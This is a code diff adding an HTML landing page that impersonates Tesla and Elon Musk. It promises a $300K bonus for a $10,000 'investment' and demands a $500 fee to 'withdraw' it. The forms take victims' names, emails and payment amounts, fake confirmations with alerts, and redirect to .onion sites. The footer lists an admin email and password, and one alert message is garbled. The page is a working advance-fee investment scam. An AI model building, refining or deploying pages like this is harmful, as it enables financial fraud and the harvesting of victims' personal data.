@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>⚡ Tesla Owners | Elon’s Secret Fund</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div class="logo">TESLA OWNERS</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Invest</a>
+            <a href="#">Withdraw</a>
+            <a href="#">FAQ</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <h1>Join Tesla Ownership & Earn $300K</h1>
+        <p>Use the ELON code to unlock your bonus instantly!</p>
+        <button onclick="createAccount()">Create Account</button>
+    </section>
+
+    <section class="card">
+        <h2>🚀 Invest $10,000</h2>
+        <p>Buy Tesla ownership and get your $300K bonus with ELON code.</p>
+        <form id="investForm">
+            <input type="text" placeholder="Full Name" required/>
+            <input type="email" placeholder="Email" required/>
+            <input type="number" placeholder="Investment Amount" required/>
+            <button type="submit">Invest Now</button>
+        </form>
+    </section>
+
+    <section class="card">
+        <h2>💸 Withdraw Bonus</h2>
+        <p>Pay $500 to unlock your $300K bonus!</p>
+        <form id="withdrawForm">
+            <input type="number" placeholder="Enter $500" required/>
+            <button type="submit">Withdraw Now</button>
+        </form>
+    </section>
+
+    <footer>
+        <p>© 2026 Tesla Owners. Admin: unitedstategood@gmail.com | Password: 081152</p>
+    </footer>
+
+    <script>
+        document.getElementById("investForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            alert("Investment confirmed. Your bonus is now locked. Pay $500 to withdraw.");
+            window.location.href = "https://tesla-withdrawal.onion/";
+        });
+
+        document.getElementById("withdrawForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            alert("Withdrawal Pet purchased. Your $300K is now unlocked!");
+            window.location.href = "https://tesla-dashboard.onion/";
+        });
+    </script>
+</body>
+                                                </html>
